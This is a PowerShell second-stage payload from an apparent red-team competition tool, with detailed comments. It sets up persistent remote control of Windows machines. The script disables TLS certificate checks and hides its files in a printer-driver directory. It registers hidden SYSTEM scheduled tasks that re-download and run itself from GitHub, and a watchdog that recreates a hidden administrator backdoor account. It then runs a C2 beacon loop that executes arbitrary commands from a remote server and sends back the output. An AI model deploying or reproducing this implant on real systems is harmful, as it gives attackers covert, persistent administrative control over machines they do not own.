# payload.ps1

# Second stage payload that lives in the CDT_Red_Team_Tool GitHub repo.
# Downloaded and executed by bootstrap.ps1 on every CloudBase-init run,
# and re-downloaded and re-executed every 10 minutes by the ssh-scoring-check
# scheduled task. Because this file is pulled fresh from GitHub on every
# execution, any changes pushed to the repo are automatically picked up
# on the next run without needing to redeploy via Ansible.
#
# What this script does:
#   1. Establishes a TLS-bypassing HTTPS beacon to the Kali C2 server
#   2. Creates a scheduled task that re-pulls and re-runs this script every 10 minutes
#   3. Creates a watchdog scheduled task that recreates the backdoor user if deleted
#   4. Enters a persistent beacon loop checking in with the C2 every 30 seconds

# ── C2 server connection details ──────────────────────────────────────────────
# The Kali machine IP is left as a placeholder in the repo and replaced
# automatically by setup_kali.sh using sed before the first deployment.
# Update this if the Kali machine IP changes between competition rounds.
$C2      = "https://<KALI_IP>"

# ── Agent authentication token ────────────────────────────────────────────────
# The shared secret used to authenticate this agent with the C2 server.
# Must match the secret configured in c2_server.py. The secret is hashed
# with SHA256 and the hex digest is sent as the X-Agent-Token header with
# every request. The C2 server rejects any request with a missing or
# incorrect token with a generic 404 response.
# -join is used instead of Join-String for compatibility with PowerShell 5.1
# which is the default version on Windows 11. Join-String was only introduced
# in PowerShell 7 and would cause a silent failure on older versions.
$Secret  = "foxtrot-redteam-2026"
$Token   = -join ([System.Security.Cryptography.SHA256]::Create().ComputeHash(
               [System.Text.Encoding]::UTF8.GetBytes($Secret)
           ) | ForEach-Object { $_.ToString("x2") })

# The agent ID is the hostname of the compromised machine. This is how the
# C2 server distinguishes between multiple targets beaconing simultaneously.
# Must be used exactly (including case) when issuing commands via curl.
$AgentId = $env:COMPUTERNAME

# HTTP headers sent with every beacon request. X-Agent-Token carries the
# authentication token. Content-Type tells the C2 server to expect JSON.
$Headers = @{ "X-Agent-Token" = $Token; "Content-Type" = "application/json" }

# ── TLS certificate bypass ────────────────────────────────────────────────────
# The C2 server uses a self-signed certificate that is not trusted by any
# certificate authority. By default PowerShell's Invoke-RestMethod rejects
# connections to servers with untrusted certificates. This .NET class
# overrides the certificate validation policy to accept all certificates
# regardless of their trust chain. Add-Type compiles the C# class at runtime
# and New-Object installs it as the global certificate policy for this
# PowerShell session.
add-type @"
using System.Net; using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert,
        WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll

# ── Hidden working directory ──────────────────────────────────────────────────
# All files written by this script are stored in the printer color profiles
# directory rather than obvious locations like C:\Windows\Temp or
# C:\Users\Public. This directory always exists on Windows, is rarely
# monitored, and blends in with legitimate system files making our
# scripts less likely to be spotted by blue team during manual inspection.
$workDir = "C:\Windows\System32\spool\drivers\color"

# ── Persistence via scheduled task ─────────────────────────────────
# Creates a scheduled task named ssh-scoring-check that re-downloads and
# re-executes this payload script every 10 minutes. This provides persistence
# independent of CloudBase-init meaning our payload continues running even if
# blue team disables or removes CloudBase-init entirely. The task name is
# chosen to look like legitimate competition scoring infrastructure that
# blue team would be reluctant to remove.
#
# The task action downloads payload.ps1 from GitHub to svc.ps1 in the hidden
# working directory then immediately executes it. svc.ps1 is a temporary file
# that exists only during execution and is overwritten on every run.
$action  = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/BSparacio/CDT_Red_Team_Tool/main/payload.ps1' -OutFile $workDir\svc.ps1 -UseBasicParsing; powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $workDir\svc.ps1`""

# Trigger fires every 10 minutes starting from the moment the task is created.
# -Once -At (Get-Date) with a RepetitionInterval creates a repeating trigger
# that starts immediately rather than waiting for a specific future time.
$trigger   = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 10) -Once -At (Get-Date)

# -Hidden prevents the task from appearing in the standard Task Scheduler UI
# view making it harder for blue team to spot during casual inspection.
$settings  = New-ScheduledTaskSettingsSet -Hidden

# Running as SYSTEM with ServiceAccount logon type means the task executes
# regardless of which user is logged in or whether any user is logged in at all.
# This is critical because cloudbase-init is a service account that is never
# interactively logged in, so Interactive logon type would never fire.
# RunLevel Highest gives the task full administrator privileges.
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# -Force overwrites the task if it already exists from a previous deployment
# ensuring the task definition stays current with any changes we make.
Register-ScheduledTask -TaskName "ssh-scoring-check" `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -Principal $principal `
    -Force

# ── Backdoor user watchdog scheduled task ───────────────────────────
# Creates a second scheduled task named service-health-monitor that checks
# every 5 minutes whether the backdoor user cloudbase-init1 still exists
# and recreates it if blue team has deleted it. The watchdog logic is written
# as a here-string and saved to drv.ps1 in the hidden working directory.
# drv.ps1 persists on disk permanently since the watchdog task needs to call
# it repeatedly unlike svc.ps1 which is only needed during execution.
$watchdog = @'
$hostname   = $env:COMPUTERNAME.ToLower()
$username   = "cloudbase-init1"
$seed       = "redteam-rit-2026"
$bytes      = [System.Text.Encoding]::UTF8.GetBytes($seed + $hostname)
$hash       = [System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes)
$password   = ([Convert]::ToBase64String($hash)).Substring(0,16) + "!A1"
$securePass = ConvertTo-SecureString $password -AsPlainText -Force

if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
    New-LocalUser -Name $username -Password $securePass -PasswordNeverExpires
    Add-LocalGroupMember -Group "Administrators" -Member $username
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
    Set-ItemProperty -Path $regPath -Name $username -Value 0 -Type DWord
}
'@

# Writes the watchdog script to the hidden working directory as drv.ps1.
# -Force overwrites any existing version ensuring the script stays current.
$watchdog | Out-File "$workDir\drv.ps1" -Force

$watchdogAction    = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File $workDir\drv.ps1"

# Fires every 5 minutes — more frequently than the payload task so the
# backdoor user is restored quickly if blue team runs a cleanup script.
$watchdogTrigger   = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
$watchdogSettings  = New-ScheduledTaskSettingsSet -Hidden
$watchdogPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "service-health-monitor" `
    -Action $watchdogAction `
    -Trigger $watchdogTrigger `
    -Settings $watchdogSettings `
    -Principal $watchdogPrincipal `
    -Force

# ── C2 beacon loop ────────────────────────────────────────────────────────────
# Runs indefinitely in the background as a hidden PowerShell process.
# Every 30 seconds the agent checks in with the C2 server by sending a
# POST request to the /beacon endpoint. The request includes the agent ID
# and any command output from the previous execution cycle.
# The C2 server responds with either a command to execute or null if the
# operator has not queued anything. Results are sent back to the C2 on
# the next beacon after execution completes.
# The outer try/catch silently suppresses any network errors so temporary
# C2 unavailability does not kill the beacon loop — it simply retries
# on the next 30 second interval.
while ($true) {
    try {
        # Build the check-in request body with the agent ID.
        # result is null on the initial check-in and populated with
        # command output on subsequent beacons after a command was run.
        $body = @{ id = $AgentId; result = $null } | ConvertTo-Json
        $resp = Invoke-RestMethod -Uri "$C2/beacon" -Method POST `
                    -Headers $Headers -Body $body

        # If the C2 server returned a command execute it and capture output.
        # Invoke-Expression runs arbitrary PowerShell strings as code.
        # 2>&1 redirects stderr to stdout so error messages are captured.
        # Out-String converts the output object to a plain string for
        # transmission back to the C2 server.
        if ($resp.cmd) {
            $output = try { Invoke-Expression $resp.cmd 2>&1 | Out-String } catch { $_.Exception.Message }

            # Send the command output back to the C2 server in the result field.
            # The server prints this to the operator terminal immediately.
            $body2  = @{ id = $AgentId; result = $output } | ConvertTo-Json
            Invoke-RestMethod -Uri "$C2/beacon" -Method POST -Headers $Headers -Body $body2
        }
    } catch { }

    # Wait 30 seconds before the next beacon check-in. Adjust this value
    # to balance responsiveness against network noise — lower values give
    # faster command response times but generate more detectable traffic.
    Start-Sleep -Seconds 30
}